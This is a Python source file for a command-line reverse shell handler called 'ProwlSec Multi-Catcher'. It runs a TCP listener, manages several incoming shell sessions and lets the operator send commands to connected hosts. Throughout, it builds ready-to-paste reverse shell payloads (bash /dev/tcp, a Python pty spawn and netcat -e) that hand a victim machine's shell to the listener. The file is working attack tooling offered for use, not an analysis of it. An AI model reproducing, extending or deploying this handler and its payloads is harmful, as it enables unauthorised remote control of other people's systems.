import socket
import threading
import sys
import time
import shlex
import argparse
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from cmd import Cmd

LISTEN_HOST = '0.0.0.0'
DEFAULT_PORT = 4444
MAX_CONNECTIONS = 10 
STYLED_PROMPT = "[bold #00FFFF]ProwlSec > [/bold #00FFFF]"
SHELL_PROMPT = "[bold #FF88FF]session {id} > [/bold #FF88FF]"

console = Console()
session_manager = {} 
session_counter = 0
listener = None
stop_main_loop = threading.Event() 
current_session = None
PAYLOAD_OPTIONS = {} 
def init_options(port):
    global PAYLOAD_OPTIONS
    PAYLOAD_OPTIONS.update({
        'LHOST': {'value': LISTEN_HOST, 'description': 'The listen address (local host) for the connection.'},
        'LPORT': {'value': str(port), 'description': 'The listen port (local port) for the connection.'},
        'PAYLOAD': {'value': 'reverse_tcp/bash', 'description': 'The staged payload to be used.'}
    })
PAYLOADS = {
    "reverse_tcp/bash": {
        "description": "Standard TTY reverse shell using Bash.",
        "cmd": lambda h, p: f"bash -i >& /dev/tcp/{h}/{p} 0>&1"
    },
    "reverse_tcp/python": {
        "description": "Python TTY reverse shell with pty spawn.",
        "cmd": lambda h, p: f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{h}\",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
    },
    "reverse_tcp/netcat": {
        "description": "Classic netcat reverse shell (requires -e option or similar).",
        "cmd": lambda h, p: f"nc -e /bin/sh {h} {p}"
    }
}
def display_initial_banner():
    console.print("[bold #FF00FF]MADE BY PROWLSEC[/bold #FF00FF]")
    console.print(Text.assemble(
        ("Multi-Catcher v0.8", "bold #00FFFF"),
    ))  
def make_options_table():
    table = Table(
        title="[bold #00FFFF]Payload Options[/bold #00FFFF]", 
        show_header=True, 
        header_style="bold underline #FF00FF",
        padding=(0,1)
    )
    table.add_column("Name", style="bold cyan")
    table.add_column("Value", style="yellow")
    table.add_column("Description", style="dim white")
    for name, data in PAYLOAD_OPTIONS.items():
        table.add_row(
            name, 
            str(data['value']), 
            data['description']
        )
    return table  
def make_session_table():
    table = Table(
        title="[bold #FF00FF]Active Sessions[/bold #FF00FF]", 
        show_header=True,
        header_style="bold underline #00FFFF",
        padding=(0,1)
    )
    table.add_column("#", style="#FF00FF", justify="right")
    table.add_column("Remote IP:Port", style="yellow")
    table.add_column("Status", style="green")
    if not session_manager:
        table.add_row("---", "No sessions", "Waiting...")
    else:
        for id, session in session_manager.items():
            table.add_row(
                str(id), 
                f"{session.addr[0]}:{session.addr[1]}", 
                "Active" if session.active else "Closed"
            )
    return table
class Session:
    def __init__(self, connection, address, session_id):
        self.conn = connection
        self.addr = address
        self.id = session_id
        self.active = True
        threading.Thread(target=self._initial_handler, daemon=True).start() 
    def _initial_handler(self):
        console.print(f"\n[bold green]>[/bold green] Session [yellow]#{self.id}[/yellow] opened from [magenta]{self.addr[0]}:{self.addr[1]}[/magenta]. Use 'interact {self.id}'")
        if current_session is None:
            console.print(STYLED_PROMPT, end='')
    def interactive_mode(self):
        global current_session
        current_session = self.id
        console.print(f"[bold yellow]Entering interactive mode for Session #{self.id}. Type 'background' to return.[/bold yellow]")
        while self.active and current_session == self.id:
            try:
                shell_input = console.input(SHELL_PROMPT.format(id=self.id))
                if shell_input.lower().strip() in ('exit', 'quit'):
                    self.conn.sendall(b'exit\n') 
                    self.close()
                    break
                if shell_input.lower().strip() == 'background':
                    console.print(f"[bold yellow]Session #{self.id} moved to background.[/bold yellow]")
                    current_session = None
                    break
                if not shell_input:
                    continue
                self.conn.sendall((shell_input + '\n').encode())
                output = self.conn.recv(8192).decode('utf-8', errors='ignore')
                console.print(output, end='')
            except socket.error:
                console.print(f"\n[bold red]Connection lost for Session #{self.id}.[/bold red]")
                self.close()
                break
            except EOFError:
                console.print(f"\n[bold red]Session #{self.id} closed by remote host.[/bold red]")
                self.close()
                break
            except KeyboardInterrupt:
                self.conn.sendall(b'\n'.encode())
                current_session = None
                break
    def close(self):
        global current_session
        if self.active:
            self.active = False
            self.conn.close()
            if self.id in session_manager:
                del session_manager[self.id]
            if current_session == self.id:
                current_session = None
            console.print(f"\n[bold red]<[/bold red] Session [yellow]#{self.id}[/yellow] closed.")
            
            if current_session is None and not stop_main_loop.is_set():
                 console.print(STYLED_PROMPT, end='')
class TCPListener:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.running = False
        self.thread = None
    def start(self):
        self.host = PAYLOAD_OPTIONS['LHOST']['value']
        self.port = int(PAYLOAD_OPTIONS['LPORT']['value'])     
        try:
            self.sock.bind((self.host, self.port))
            self.sock.listen(MAX_CONNECTIONS)
            self.running = True
            self.thread = threading.Thread(target=self._listen_loop, daemon=True)
            self.thread.start()
            console.print(f"[bold green]Listener Thread Started successfully.[/bold green] Listening from [magenta]{self.host}:{self.port}[/magenta]")
            return True
        except Exception as e:
            console.print(f"[bold red]ERROR:[/bold red] Could not start listener on {self.host}:{self.port}. Reason: {e}")
            return False
    def _listen_loop(self):
        global session_counter
        while self.running and not stop_main_loop.is_set():
            self.sock.settimeout(0.1) 
            try:
                conn, addr = self.sock.accept()
                session_counter += 1
                session = Session(conn, addr, session_counter)
                session_manager[session_counter] = session
            except socket.timeout:
                continue 
            except Exception as e:
                 if self.running:
                     if not stop_main_loop.is_set():
                        console.print(f"General listener error: {e}", style="bold red")    
    def close_quietly(self):
        if self.running:
            self.running = False
            try:
                self.sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass 
            finally:
                self.sock.close()
                console.print(f"[bold red]Listener on {self.host}:{self.port} stopped.[/bold red]")
class ProwlSecCli(Cmd):
    prompt = ''
    def preloop(self):
        self.use_rawinput = True  
    def do_help(self, arg):
        if arg:
            super().do_help(arg)
            return
        help_table = Table(title=None, show_header=False, show_lines=False, padding=(0,2))
        command_style = "bold #FF88FF"
        desc_style = "white dim"
        help_table.add_column("Command", style=command_style)
        help_table.add_column("Description", style=desc_style) 
        help_table.add_row("start", "Start the main TCP listener on the configured LHOST/LPORT.")
        help_table.add_row("stop", "Stop the active TCP listener.")
        help_table.add_row("show", "Display active options, available payloads, or the command to run.")
        help_table.add_row("set", "Set a parameter (LHOST, LPORT, PAYLOAD). Example: set LPORT 8080")
        help_table.add_row("interact", "Resume/interact with an active session. Usage: interact <ID>")
        help_table.add_row("sessions", "List or kill active sessions. Usage: sessions -l / -k <ID>")
        help_table.add_row("help", "Print this help menu.")
        help_table.add_row("listeners", "Manage listener threads (Future feature).")
        help_table.add_row("exit/quit", "Exit the program, closing all connections and listeners.")
        console.print(Panel(help_table, title="[bold #00FFFF]ProwlSec Command Manual[/bold #00FFFF]", border_style="#FF00FF"))
    def do_start(self, arg):
        global listener
        if listener is not None and listener.running:
            console.print("[bold yellow]Listener is already running.[/bold yellow]")
            return      
        host = PAYLOAD_OPTIONS['LHOST']['value']
        port = int(PAYLOAD_OPTIONS['LPORT']['value'])
        listener = TCPListener(host, port)
        listener.start()      
    def do_stop(self, arg):
        global listener
        if listener is None or not listener.running:
            console.print("[bold yellow]No listener is currently running.[/bold yellow]")
            return    
        listener.close_quietly()     
    def do_quit(self, arg):
        return True
    def do_exit(self, arg):
        return self.do_quit(arg)    
    def do_sessions(self, line):
        args = shlex.split(line.strip())  
        if not args or args[0] in ('-l', '--list'):
            console.print(make_session_table())
        elif args[0] in ('-k', '--kill') and len(args) == 2:
            try:
                session_id = int(args[1])
                if session_id in session_manager:
                    session_manager[session_id].close()
                else:
                    console.print(f"[bold red]Session ID {session_id} not found.[/bold red]")
            except ValueError:
                console.print("[bold red]Invalid session ID. Must be a number.[/bold red]")
        else:
            self.do_help("sessions")
    def do_interact(self, line):
        try:
            session_id = int(line.strip())
        except ValueError:
            console.print("[bold red]Invalid session ID. Usage: interact <ID>[/bold red]")
            return
        if session_id not in session_manager:
            console.print(f"[bold red]Session ID {session_id} not found.[/bold red]")
            return
        session = session_manager[session_id]
        session.interactive_mode()
    def do_show(self, line):
        args = line.strip().lower()
        if args == "options":
            console.print(make_options_table())
        elif args == "payloads":
            payload_table = Table(title="[bold #FF00FF]Available Payloads[/bold #FF00FF]", show_header=True, header_style="bold underline #00FFFF")
            payload_table.add_column("Name", style="bold #FF00FF")
            payload_table.add_column("Description", style="white")
            for name, data in PAYLOADS.items():
                payload_table.add_row(name, data['description'])
            console.print(payload_table)
        elif args == "payload_cmd":
            payload_name = PAYLOAD_OPTIONS['PAYLOAD']['value']
            if payload_name in PAYLOADS:
                cmd_func = PAYLOADS[payload_name]['cmd']
                lhost = PAYLOAD_OPTIONS['LHOST']['value']
                lport = PAYLOAD_OPTIONS['LPORT']['value']
                generated_cmd = cmd_func(lhost, lport)
                console.print(Panel(
                    generated_cmd, 
                    title=f"[bold #00FFFF]Generated Command for {payload_name}[/bold #00FFFF]", 
                    border_style="#FF00FF"
                ))
            else:
                console.print(f"[bold red]Invalid or unsupported payload selected: {payload_name}[/bold red]")
        else:
            self.do_help("show")
    def do_set(self, line):
        parts = shlex.split(line.strip())
        if len(parts) != 2:
            console.print("[bold red]Usage: set <option_name> <value>[bold red]")
            return
        name, value = parts
        name = name.upper()
        if name in PAYLOAD_OPTIONS:
            if name == 'LPORT':
                try:
                    int(value)
                except ValueError:
                    console.print("[bold red]LPORT must be an integer.[/bold red]")
                    return       
            if name == 'PAYLOAD' and value not in PAYLOADS:
                console.print(f"[bold red]Unknown payload: {value}. Use 'show payloads' to view options.[/bold red]")
                return
            PAYLOAD_OPTIONS[name]['value'] = value
            console.print(f"[bold green]{name}[/bold green] => [yellow]{value}[/yellow]")       
            if name == 'LPORT' and listener and listener.running:
                 console.print("[bold yellow]LPORT changed. Remember to 'stop' and 'start' the listener for the change to take effect.[/bold yellow]")
    def do_listeners(self, arg):
        console.print("[bold yellow]Multi-listener functionality is a future feature. Currently, only one listener is supported.[/bold yellow]")


def parse_args():
    parser = argparse.ArgumentParser(
        description="ProwlSec Multi-Catcher: A clean, multi-session reverse shell handler.",
        epilog="Use 'help' within the tool to see commands."
    )
    parser.add_argument('-p', '--port', type=int, default=DEFAULT_PORT, help=f'The initial listening port (default: {DEFAULT_PORT}) to set in LPORT option.')
    return parser.parse_args()

def main():
    global listener
    args = parse_args()
    init_options(args.port)
    display_initial_banner()   
    cli = ProwlSecCli()   
    try:
        while not stop_main_loop.is_set():
            if current_session is not None:
                time.sleep(0.1)
                continue
            try:
                line = console.input(STYLED_PROMPT)                
                if cli.onecmd(line.strip()) is True: 
                    stop_main_loop.set()                
            except KeyboardInterrupt:
                console.print("\n[bold yellow]Type 'quit' or 'exit' to cleanly close all connections.[/bold yellow]")
            except EOFError:
                stop_main_loop.set()                
    finally:
        console.print("\n[bold yellow]Shutting down listener and sessions...[/bold yellow]")        
        stop_main_loop.set()
        if listener and listener.running:
            listener.close_quietly()

        for ses in list(session_manager.values()):
            ses.close()
            
        console.print("[bold cyan]Exiting ProwlSec Multi-Catcher. Goodbye.[/bold cyan]")
if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        console.print(f"\n[bold red]CRITICAL STARTUP ERROR:[/bold red] {e}")
        sys.exit(1)